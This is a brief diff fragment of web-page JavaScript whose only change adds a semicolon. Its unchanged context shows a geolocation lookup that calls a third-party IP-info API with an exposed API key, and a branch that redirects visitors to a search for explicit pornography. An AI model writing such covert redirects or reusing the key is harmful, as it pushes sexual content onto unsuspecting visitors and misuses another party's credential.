@@ -8,4 +8,4 @@ fetch('https://api.geoapify.com/v1/ipinfo?apiKey=8c80401505ff4b0abee56fcf7e8191c
         window.location = "https://www.google.com/search?q=gay+furry+porn";
       }
     }
-  })
+  });
